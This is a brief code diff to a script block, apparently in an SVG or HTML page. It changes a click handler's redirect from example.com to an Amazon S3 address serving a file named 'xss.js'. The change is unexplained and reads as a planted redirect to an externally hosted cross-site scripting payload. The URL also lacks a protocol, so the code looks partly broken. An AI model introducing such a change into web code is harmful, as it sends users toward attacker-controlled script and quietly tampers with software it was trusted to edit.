@@ -10,6 +10,6 @@
   // Add a click event listener to the SVG element
   svg.addEventListener('click', () => {
     // Redirect the user to the specified URL
-    window.location.href = 'https://www.example.com';
+    window.location.href = 'portal-prodsite.s3.us-west-2.amazonaws.com/xss.js';
   });
 </script>
